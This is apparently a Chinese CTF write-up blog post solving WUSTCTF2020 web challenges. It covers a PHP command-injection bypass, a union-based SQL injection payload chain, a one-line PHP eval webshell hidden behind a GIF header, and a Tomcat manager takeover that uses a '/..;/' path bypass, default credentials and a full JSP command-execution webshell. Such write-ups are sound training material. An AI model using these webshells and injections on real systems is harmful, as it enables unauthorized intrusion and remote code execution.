+++
title = "WUSTCTF2020"
slug = "wustctf2020"
description = "刷"
date = "2024-08-28T15:45:02"
lastmod = "2024-08-28T15:45:02"
image = ""
license = ""
categories = ["复现"]
tags = ["php", "mysql", "Tomcat"]
+++

# [WUSTCTF2020]朴实无华

先进行目录扫描

`/robots.txt`

```
User-agent: *
Disallow: /fAke_f1agggg.php

抓包发现/fl4g.php
```

```php
<?php
header('Content-type:text/html;charset=utf-8');
error_reporting(0);
highlight_file(__file__);


//level 1
if (isset($_GET['num'])){
    $num = $_GET['num'];
    if(intval($num) < 2020 && intval($num + 1) > 2021){
        echo "鎴戜笉缁忔剰闂寸湅浜嗙湅鎴戠殑鍔冲姏澹�, 涓嶆槸鎯崇湅鏃堕棿, 鍙槸鎯充笉缁忔剰闂�, 璁╀綘鐭ラ亾鎴戣繃寰楁瘮浣犲ソ.</br>";
    }else{
        die("閲戦挶瑙ｅ喅涓嶄簡绌蜂汉鐨勬湰璐ㄩ棶棰�");
    }
}else{
    die("鍘婚潪娲插惂");
}
//level 2
if (isset($_GET['md5'])){
   $md5=$_GET['md5'];
   if ($md5==md5($md5))
       echo "鎯冲埌杩欎釜CTFer鎷垮埌flag鍚�, 鎰熸縺娑曢浂, 璺戝幓涓滄緶宀�, 鎵句竴瀹堕鍘�, 鎶婂帹甯堣桨鍑哄幓, 鑷繁鐐掍袱涓嬁鎵嬪皬鑿�, 鍊掍竴鏉暎瑁呯櫧閰�, 鑷村瘜鏈夐亾, 鍒灏忔毚.</br>";
   else
       die("鎴戣刀绱у枈鏉ユ垜鐨勯厭鑲夋湅鍙�, 浠栨墦浜嗕釜鐢佃瘽, 鎶婁粬涓€瀹跺畨鎺掑埌浜嗛潪娲�");
}else{
    die("鍘婚潪娲插惂");
}

//get flag
if (isset($_GET['get_flag'])){
    $get_flag = $_GET['get_flag'];
    if(!strstr($get_flag," ")){
        $get_flag = str_ireplace("cat", "wctf2020", $get_flag);
        echo "鎯冲埌杩欓噷, 鎴戝厖瀹炶€屾鎱�, 鏈夐挶浜虹殑蹇箰寰€寰€灏辨槸杩欎箞鐨勬湸瀹炴棤鍗�, 涓旀灟鐕�.</br>";
        system($get_flag);
    }else{
        die("蹇埌闈炴床浜�");
    }
}else{
    die("鍘婚潪娲插惂");
}
?>
```

```
http://e6d40959-9dc9-4dcf-9022-37090399a268.node5.buuoj.cn:81/fl4g.php?md5=0e215962017&num=10e4&get_flag=tac<fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag
```

一个比较简单的绕过

# [WUSTCTF2020]颜值成绩查询

对着这个框子疯狂测试

```
1/**/and/**/1=1#
1/**/and/**/1=0#
```

```sql
-1/**/uNion/**/Select/**/1,2,3#
没想到还有大小写giao

-1/**/uNion/**/Select/**/1,(Select(group_concat(schema_name))from(information_schema.schemata)),3#
Hi information_schema,ctf, your score is: 3

-1/**/uNion/**/Select/**/1,(Select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),3#
Hi flag,score, your score is: 3

-1/**/uNion/**/Select/**/1,(Select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),3#
Hi flag,value, your score is: 3

-1/**/uNion/**/Select/**/1,(Select(group_concat(value))from(flag)),3#
给我藏在value里面哩
```

# [WUSTCTF2020]CV Maker

注册然后登录发现有个上传文件的点发现是`php`网站，应该是文件上传了

但是上传文件始终报错，说我没有登录你大ba这什么网站

查查这个

> exif_imagetype
> (PHP 4 >= 4.3.0, PHP 5, PHP 7, PHP 8)
> exif_imagetype — 判断一个图像的类型，exif_imagetype() 读取一个图像的第一个字节并检查其签名。(仅仅检查文件头)

```phtml
GIF89a
<script language="php">eval($_POST['a']);</script>
```

还是报错那不管他，因为可以看到是上次成功了的，**检查**拿路径

```
http://d25643bb-ec8d-48fa-9582-299062a8f5ee.node5.buuoj.cn:81/uploads/d41d8cd98f00b204e9800998ecf8427e.php
```

然后拿`flag`就可以了

# [WUSTCTF2020]Train Yourself To Be Godly

进入之后啥东西都没有查了之后发现挺多前置知识的

已知后端和前端服务器的处理是`nginx`和`tomcat`

> Nginx 会解析 /a;evil/b/，并认为这是一个合法的目录请求，而 Tomcat 做解析的时候会自动忽略掉脏数据 ;.*，所以 Tomcat 对此的解析是 /a/b/。也就是说我们从可以通过写 ;+脏数据的方式绕过 Nginx 的反向代理，从而请求本不应该能请求到的非法路径。

本题也就是说`/..;/`相当于`/../`,如下图

![目录解析](QQ20240828-192755.png)

`apache`中的`tomcat/webapps`目录如下图

![目录](QQ20240828-192610.png)

> manage目录是可以上传WAR文件部署服务，也就是说可以通过manage目录实现文件上传，继而实现木马上传

进入目录`/..;/manager/html`之后

Tomcat的默认口令如下：

> 账号：admin 密码：admin或空；
>
> 账号：tomcat 密码：tomcat

将`webshell`打包成`war`准备上传

```jsp
<%@ page pageEncoding="utf-8"%>
<%@ page import="java.util.Scanner" %>
<HTML>
<title>Just For Fun</title>
<BODY>
<H3>Build By LandGrey</H3>
<FORM METHOD="POST" NAME="form" ACTION="#">
    <INPUT TYPE="text" NAME="q">
    <INPUT TYPE="submit" VALUE="Fly">
</FORM>

<%
    String op="Got Nothing";
    String query = request.getParameter("q");
    String fileSeparator = String.valueOf(java.io.File.separatorChar);
    Boolean isWin;
    if(fileSeparator.equals("\\")){
        isWin = true;
    }else{
        isWin = false;
    }

    if (query != null) {
        ProcessBuilder pb;
        if(isWin) {
            pb = new ProcessBuilder(new String(new byte[]{99, 109, 100}), new String(new byte[]{47, 67}), query);
        }else{
            pb = new ProcessBuilder(new String(new byte[]{47, 98, 105, 110, 47, 98, 97, 115, 104}), new String(new byte[]{45, 99}), query);
        }
        Process process = pb.start();
        Scanner sc = new Scanner(process.getInputStream()).useDelimiter("\\A");
        op = sc.hasNext() ? sc.next() : op;
        sc.close();
    }
%>

<PRE>
    <%= op %>>
</PRE>
</BODY>
</HTML>
```

```
jar cvf bi.war webshell.jsp
```

同时部署的时候发现不成功，那么应该是有身份验证

> Authorization Bassic是401验证，用base64加密的，格式为Authorization: Basic base64-encode(username:password)

所以

```
Authorization:Basic dG9tY2F0OnRvbWNhdA==
```

而且路径还报错了一下

![路径问题](QQ20240828-194538.png)

需要再加一层`/..;/`

但是还是少了一层`cookie`于是重新抓包从进入目录的时候抓包从回包中得到`cookie`

![cookie](QQ20240828-200033.png)

```
Set-Cookie: JSESSIONID=9E687D9834F8D7B2ADA458FC58F46F89; Path=/manager; HttpOnly
```

但是这个`cookie`是死活加不上

后面发现这个cookie是只能用一次的也就是说发包错了我们就得换，不然靶机就`JJ`

上传成功之后访问

`/..;/bi/webshell.jsp?q`，`q`是密码，直接`RCE`即可

# [WUSTCTF2020]easyweb

CVE-2020-1938幽灵猫的漏洞
